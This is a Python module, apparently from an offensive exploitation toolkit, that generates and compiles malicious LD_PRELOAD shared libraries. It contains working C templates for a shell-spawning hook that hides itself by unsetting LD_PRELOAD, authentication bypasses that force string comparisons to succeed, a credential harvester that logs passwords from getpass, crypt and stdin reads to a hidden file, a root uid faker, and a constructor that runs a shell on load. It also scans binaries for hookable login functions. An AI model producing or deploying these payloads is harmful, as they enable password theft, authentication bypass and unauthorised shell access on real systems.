"""
LD_PRELOAD exploit generator.

Generates malicious shared libraries for:
- Function hooking/hijacking
- Library injection
- SUID privilege escalation
- Credential harvesting
"""

import os
import subprocess
import tempfile
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Callable, Dict, List, Optional, Tuple

from supwngo.core.binary import Binary
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


class HookType(Enum):
    """Types of function hooks."""
    SHELL_SPAWN = auto()       # Hook to spawn shell
    CREDENTIAL_CAPTURE = auto() # Capture passwords/credentials
    FUNCTION_BYPASS = auto()   # Bypass security checks
    CODE_INJECT = auto()       # Inject arbitrary code
    ENV_MODIFY = auto()        # Modify environment


@dataclass
class FunctionHook:
    """Represents a function hook."""
    function_name: str
    hook_type: HookType
    custom_code: str = ""
    preserve_original: bool = True
    return_value: Optional[str] = None


@dataclass
class PreloadPayload:
    """Generated LD_PRELOAD payload."""
    source_code: str
    compile_command: str
    usage_command: str
    description: str
    hooks: List[str] = field(default_factory=list)


class LDPreloadGenerator:
    """
    Generate malicious shared libraries for LD_PRELOAD injection.
    """

    # Common functions to hook for privilege escalation
    PRIV_ESC_HOOKS = {
        "getuid": "return 0;",
        "geteuid": "return 0;",
        "getgid": "return 0;",
        "getegid": "return 0;",
    }

    # Functions commonly used for authentication
    AUTH_FUNCTIONS = [
        "strcmp", "strncmp", "memcmp",
        "crypt", "crypt_r",
        "pam_authenticate", "pam_acct_mgmt",
        "check_password", "verify_password",
    ]

    def __init__(self, output_dir: str = "/tmp"):
        """
        Initialize generator.

        Args:
            output_dir: Directory for output files
        """
        self.output_dir = output_dir

    def generate_shell_hook(
        self,
        hook_function: str = "getuid",
        shell: str = "/bin/sh",
    ) -> PreloadPayload:
        """
        Generate a library that spawns a shell when hooked function is called.

        Args:
            hook_function: Function to hook
            shell: Shell to spawn

        Returns:
            PreloadPayload with source and commands
        """
        source = f'''/*
 * LD_PRELOAD Shell Spawner
 * Hooks {hook_function}() to spawn {shell}
 *
 * Compile: gcc -shared -fPIC -o evil.so evil.c -ldl
 * Use: LD_PRELOAD=./evil.so <target_binary>
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>

static int shell_spawned = 0;

/* Hook {hook_function} */
int {hook_function}(void) {{
    if (!shell_spawned) {{
        shell_spawned = 1;

        /* Restore real uid/gid for SUID */
        setuid(0);
        setgid(0);

        /* Spawn shell */
        char *args[] = {{"{shell}", "-p", NULL}};
        execve("{shell}", args, NULL);
    }}

    /* Call original function */
    int (*original)(void) = dlsym(RTLD_NEXT, "{hook_function}");
    return original();
}}

/* Alternative: constructor runs on library load */
__attribute__((constructor))
void init(void) {{
    unsetenv("LD_PRELOAD");  /* Hide ourselves */
}}
'''
        return PreloadPayload(
            source_code=source,
            compile_command="gcc -shared -fPIC -o evil.so evil.c -ldl",
            usage_command=f"LD_PRELOAD=./evil.so <suid_binary>",
            description=f"Hooks {hook_function}() to spawn root shell",
            hooks=[hook_function],
        )

    def generate_auth_bypass(
        self,
        functions_to_hook: Optional[List[str]] = None,
    ) -> PreloadPayload:
        """
        Generate a library that bypasses authentication checks.

        Args:
            functions_to_hook: Functions to hook (default: common auth functions)

        Returns:
            PreloadPayload with source and commands
        """
        if functions_to_hook is None:
            functions_to_hook = ["strcmp", "strncmp"]

        hooks_code = ""
        for func in functions_to_hook:
            if func == "strcmp":
                hooks_code += '''
/* Always return 0 (strings match) for password checks */
int strcmp(const char *s1, const char *s2) {
    return 0;
}
'''
            elif func == "strncmp":
                hooks_code += '''
int strncmp(const char *s1, const char *s2, size_t n) {
    return 0;
}
'''
            elif func == "memcmp":
                hooks_code += '''
int memcmp(const void *s1, const void *s2, size_t n) {
    return 0;
}
'''
            elif func == "crypt":
                hooks_code += '''
/* Return expected hash for any password */
char *crypt(const char *key, const char *salt) {
    static char *(*original)(const char*, const char*) = NULL;
    if (!original) original = dlsym(RTLD_NEXT, "crypt");
    /* Just return what the program expects */
    return original("password", salt);
}
'''

        source = f'''/*
 * LD_PRELOAD Authentication Bypass
 * Hooks comparison functions to always succeed
 *
 * Compile: gcc -shared -fPIC -o bypass.so bypass.c -ldl
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <dlfcn.h>

{hooks_code}

__attribute__((constructor))
void init(void) {{
    /* Optionally log bypass attempts */
    /* fprintf(stderr, "[*] Auth bypass loaded\\n"); */
}}
'''
        return PreloadPayload(
            source_code=source,
            compile_command="gcc -shared -fPIC -o bypass.so bypass.c -ldl",
            usage_command="LD_PRELOAD=./bypass.so <target_binary>",
            description="Bypasses authentication by hooking comparison functions",
            hooks=functions_to_hook,
        )

    def generate_credential_stealer(
        self,
        output_file: str = "/tmp/.creds",
    ) -> PreloadPayload:
        """
        Generate a library that captures credentials.

        Args:
            output_file: File to write captured credentials

        Returns:
            PreloadPayload with source and commands
        """
        source = f'''/*
 * LD_PRELOAD Credential Harvester
 * Captures data passed to authentication functions
 *
 * Compile: gcc -shared -fPIC -o creds.so creds.c -ldl
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <time.h>

#define CRED_FILE "{output_file}"

static void log_credential(const char *func, const char *data) {{
    FILE *f = fopen(CRED_FILE, "a");
    if (f) {{
        time_t now = time(NULL);
        fprintf(f, "[%ld] %s: %s\\n", now, func, data);
        fclose(f);
    }}
}}

/* Hook getpass - common password input */
char *getpass(const char *prompt) {{
    static char *(*original)(const char*) = NULL;
    if (!original) original = dlsym(RTLD_NEXT, "getpass");

    char *result = original(prompt);
    if (result) {{
        log_credential("getpass", result);
    }}
    return result;
}}

/* Hook crypt - captures password before hashing */
char *crypt(const char *key, const char *salt) {{
    static char *(*original)(const char*, const char*) = NULL;
    if (!original) original = dlsym(RTLD_NEXT, "crypt");

    if (key) {{
        log_credential("crypt", key);
    }}
    return original(key, salt);
}}

/* Hook PAM authentication if available */
int pam_authenticate(void *pamh, int flags) {{
    static int (*original)(void*, int) = NULL;
    if (!original) original = dlsym(RTLD_NEXT, "pam_authenticate");

    log_credential("pam_authenticate", "[called]");
    return original(pamh, flags);
}}

/* Hook read to capture stdin (potential passwords) */
ssize_t read(int fd, void *buf, size_t count) {{
    static ssize_t (*original)(int, void*, size_t) = NULL;
    if (!original) original = dlsym(RTLD_NEXT, "read");

    ssize_t result = original(fd, buf, count);

    /* Log stdin reads that might be passwords */
    if (fd == 0 && result > 0 && result < 256) {{
        char temp[257];
        memcpy(temp, buf, result);
        temp[result] = '\\0';
        /* Remove newline */
        if (temp[result-1] == '\\n') temp[result-1] = '\\0';
        if (strlen(temp) > 0) {{
            log_credential("read_stdin", temp);
        }}
    }}

    return result;
}}

__attribute__((constructor))
void init(void) {{
    /* Clear file at start */
    FILE *f = fopen(CRED_FILE, "w");
    if (f) fclose(f);
}}
'''
        return PreloadPayload(
            source_code=source,
            compile_command="gcc -shared -fPIC -o creds.so creds.c -ldl",
            usage_command=f"LD_PRELOAD=./creds.so <target>; cat {output_file}",
            description=f"Captures credentials to {output_file}",
            hooks=["getpass", "crypt", "pam_authenticate", "read"],
        )

    def generate_uid_bypass(self) -> PreloadPayload:
        """
        Generate a library that makes process appear to run as root.

        Returns:
            PreloadPayload with source and commands
        """
        source = '''/*
 * LD_PRELOAD UID Faker
 * Makes process believe it's running as root
 *
 * Compile: gcc -shared -fPIC -o root.so root.c
 */

#include <sys/types.h>

uid_t getuid(void) { return 0; }
uid_t geteuid(void) { return 0; }
gid_t getgid(void) { return 0; }
gid_t getegid(void) { return 0; }

/* Also fake /etc/passwd lookup */
struct passwd *getpwuid(uid_t uid) {
    static struct passwd root = {
        .pw_name = "root",
        .pw_passwd = "x",
        .pw_uid = 0,
        .pw_gid = 0,
        .pw_gecos = "root",
        .pw_dir = "/root",
        .pw_shell = "/bin/bash"
    };
    return &root;
}
'''
        return PreloadPayload(
            source_code=source,
            compile_command="gcc -shared -fPIC -o root.so root.c",
            usage_command="LD_PRELOAD=./root.so <target>",
            description="Fakes uid/gid to appear as root",
            hooks=["getuid", "geteuid", "getgid", "getegid", "getpwuid"],
        )

    def generate_function_hook(
        self,
        function_name: str,
        signature: str,
        custom_code: str,
        call_original: bool = True,
    ) -> PreloadPayload:
        """
        Generate a custom function hook.

        Args:
            function_name: Name of function to hook
            signature: Full function signature (e.g., "int func(int a, char *b)")
            custom_code: C code to inject
            call_original: Whether to call original function

        Returns:
            PreloadPayload with source and commands
        """
        # Parse return type from signature
        parts = signature.split("(")
        ret_and_name = parts[0].strip()
        ret_type = ret_and_name.rsplit(" ", 1)[0] if " " in ret_and_name else "void"

        # Extract parameter types for dlsym cast
        param_part = parts[1].rstrip(")") if len(parts) > 1 else ""

        original_call = ""
        if call_original:
            original_call = f'''
    static {ret_type} (*original)({param_part}) = NULL;
    if (!original) original = dlsym(RTLD_NEXT, "{function_name}");
'''

        source = f'''/*
 * LD_PRELOAD Custom Hook: {function_name}
 *
 * Compile: gcc -shared -fPIC -o hook.so hook.c -ldl
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>

{signature} {{
{original_call}
    /* Custom code */
    {custom_code}
}}

__attribute__((constructor))
void init(void) {{
    unsetenv("LD_PRELOAD");
}}
'''
        return PreloadPayload(
            source_code=source,
            compile_command="gcc -shared -fPIC -o hook.so hook.c -ldl",
            usage_command="LD_PRELOAD=./hook.so <target>",
            description=f"Custom hook for {function_name}",
            hooks=[function_name],
        )

    def generate_constructor_payload(
        self,
        payload_code: str,
        cleanup: bool = True,
    ) -> PreloadPayload:
        """
        Generate a library that runs code on load (constructor).

        Args:
            payload_code: C code to run on library load
            cleanup: Whether to remove LD_PRELOAD from environment

        Returns:
            PreloadPayload with source and commands
        """
        cleanup_code = 'unsetenv("LD_PRELOAD");' if cleanup else ""

        source = f'''/*
 * LD_PRELOAD Constructor Payload
 * Runs code immediately when library is loaded
 *
 * Compile: gcc -shared -fPIC -o payload.so payload.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void payload(void) {{
    {cleanup_code}

    /* Payload code */
    {payload_code}
}}
'''
        return PreloadPayload(
            source_code=source,
            compile_command="gcc -shared -fPIC -o payload.so payload.c",
            usage_command="LD_PRELOAD=./payload.so <any_binary>",
            description="Executes payload code on library load",
            hooks=["__constructor__"],
        )

    def compile_payload(
        self,
        payload: PreloadPayload,
        output_name: str = "evil.so",
    ) -> Optional[str]:
        """
        Compile a payload to a shared library.

        Args:
            payload: Payload to compile
            output_name: Output filename

        Returns:
            Path to compiled library or None on failure
        """
        # Write source to temp file
        with tempfile.NamedTemporaryFile(
            mode='w',
            suffix='.c',
            delete=False,
            dir=self.output_dir
        ) as f:
            f.write(payload.source_code)
            source_path = f.name

        output_path = os.path.join(self.output_dir, output_name)

        # Compile
        cmd = f"gcc -shared -fPIC -o {output_path} {source_path} -ldl 2>/dev/null"

        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                timeout=30,
            )

            if result.returncode == 0 and os.path.exists(output_path):
                logger.info(f"Compiled payload to {output_path}")
                os.unlink(source_path)
                return output_path
            else:
                logger.error(f"Compilation failed: {result.stderr.decode()}")
                return None

        except Exception as e:
            logger.error(f"Compilation error: {e}")
            return None


class LDPreloadExploitFinder:
    """
    Find opportunities for LD_PRELOAD exploitation.
    """

    def __init__(self, binary: Binary):
        """
        Initialize finder.

        Args:
            binary: Target binary
        """
        self.binary = binary

    def is_exploitable(self) -> Tuple[bool, str]:
        """
        Check if binary is exploitable via LD_PRELOAD.

        Returns:
            (exploitable, reason) tuple
        """
        # Check if SUID/SGID
        if hasattr(self.binary, 'path'):
            try:
                stat_info = os.stat(self.binary.path)
                mode = stat_info.st_mode

                is_suid = mode & 0o4000
                is_sgid = mode & 0o2000

                if is_suid or is_sgid:
                    return False, "SUID/SGID binaries ignore LD_PRELOAD"

            except Exception:
                pass

        # Check for LD_PRELOAD checks
        if hasattr(self.binary, 'symbols'):
            for sym in self.binary.symbols:
                if "secure_getenv" in sym or "issetugid" in sym:
                    return False, f"Binary uses {sym} which may detect LD_PRELOAD"

        return True, "Binary appears exploitable via LD_PRELOAD"

    def find_hookable_functions(self) -> List[str]:
        """
        Find interesting functions to hook.

        Returns:
            List of function names that could be hooked
        """
        interesting = []

        if hasattr(self.binary, 'plt'):
            for func in self.binary.plt:
                # Auth functions
                if any(x in func.lower() for x in ["auth", "login", "pass", "crypt", "check"]):
                    interesting.append(func)
                # Privilege functions
                elif any(x in func for x in ["uid", "gid", "setuid", "setgid"]):
                    interesting.append(func)
                # File functions
                elif func in ["open", "fopen", "read", "write", "access"]:
                    interesting.append(func)
                # Comparison functions
                elif func in ["strcmp", "strncmp", "memcmp"]:
                    interesting.append(func)

        return interesting


def generate_preload_exploit(
    exploit_type: str = "shell",
    **kwargs,
) -> PreloadPayload:
    """
    Convenience function to generate LD_PRELOAD exploits.

    Args:
        exploit_type: Type of exploit ("shell", "auth_bypass", "creds", "uid")
        **kwargs: Additional arguments for specific exploit type

    Returns:
        PreloadPayload
    """
    generator = LDPreloadGenerator()

    if exploit_type == "shell":
        return generator.generate_shell_hook(
            hook_function=kwargs.get("hook_function", "getuid"),
            shell=kwargs.get("shell", "/bin/sh"),
        )
    elif exploit_type == "auth_bypass":
        return generator.generate_auth_bypass(
            functions_to_hook=kwargs.get("functions"),
        )
    elif exploit_type == "creds":
        return generator.generate_credential_stealer(
            output_file=kwargs.get("output_file", "/tmp/.creds"),
        )
    elif exploit_type == "uid":
        return generator.generate_uid_bypass()
    elif exploit_type == "constructor":
        return generator.generate_constructor_payload(
            payload_code=kwargs.get("code", 'system("/bin/sh");'),
        )
    else:
        raise ValueError(f"Unknown exploit type: {exploit_type}")
